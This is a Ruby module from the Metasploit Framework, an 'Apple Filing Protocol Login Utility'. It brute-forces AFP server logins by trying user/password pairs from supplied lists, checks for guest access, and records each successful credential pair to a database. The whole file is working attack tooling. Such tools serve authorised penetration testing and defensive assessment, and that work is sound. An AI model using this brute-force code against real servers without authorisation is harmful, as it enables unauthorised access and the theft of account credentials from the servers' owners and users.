##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'openssl'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Exploit::Remote::AFP

  def initialize(info={})
    super(update_info(info,
      'Name'         => 'Apple Filing Protocol Login Utility',
      'Description'  => %q{
        This module attempts to bruteforce authentication credentials for AFP.
      },
      'References'     =>
        [
          [ 'URL', 'https://developer.apple.com/library/mac/#documentation/Networking/Reference/AFP_Reference/Reference/reference.html' ],
          [ 'URL', 'https://developer.apple.com/library/mac/#documentation/networking/conceptual/afp/AFPSecurity/AFPSecurity.html' ]

        ],
      'Author'       => [ 'Gregory Man <man.gregory[at]gmail.com>' ],
      'License'      => MSF_LICENSE
    ))

    deregister_options('RHOST')
    register_options(
      [
        OptInt.new('LoginTimeOut', [ true, "Timout on login", 23 ]),
        OptBool.new('RECORD_GUEST', [ false, "Record guest login to the database", false]),
        OptBool.new('CHECK_GUEST', [ false, "Check for guest login", true])
      ], self)

  end

  def run_host(ip)
    print_status("Scanning IP: #{ip.to_s}")
    begin

    connect
    info = get_info # get_info drops connection
    raise "Unsupported AFP version" unless info[:uams].include?("DHCAST128")

    if datastore['CHECK_GUEST'] && info[:uams].include?("No User Authent")
      connect
      open_session
      do_guest_login
      close_session
    end

    each_user_pass do |user, pass|
      if user == ''
        return :skip_user # check guest login once per host
      end

      vprint_status("Trying to login as '#{user}' with password '#{pass}'")
      connect
      open_session
      status = do_login(user, pass)
      close_session # close_session drops connection

      status
    end
    rescue ::Timeout::Error
      raise $!
    rescue ::Interrupt
      raise $!
    rescue ::Rex::ConnectionError, ::IOError, ::Errno::ECONNRESET, ::Errno::ENOPROTOOPT
    rescue ::Exception
      print_error("#{rhost}:#{rport} #{$!.class} #{$!}")
    ensure
      close_session if sock
      disconnect
    end
  end

  def do_login(user, pass)
    status = login(user, pass)

    if status == true
      status = :next_user
      print_good("#{rhost} - SUCCESSFUL LOGIN '#{user}' : '#{pass}'")
      report_auth_info({
        :host        => rhost,
        :port        => rport,
        :sname       => 'afp',
        :user        => user,
        :pass        => pass,
        :source_type => 'user_supplied',
        :active      => true
      })
    end
    return status
  end

  def do_guest_login
    status = login('', '')
    if status
      status = :next_user
      print_good("#{rhost} Supports Guest logins")

      if datastore['RECORD_GUEST']
        report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => 'atp',
          :user => '',
          :pass => '',
          :type => "Guest Login",
          :source_type => "user_supplied",
          :active => true
        )
      end
    end
    return status
  end
end
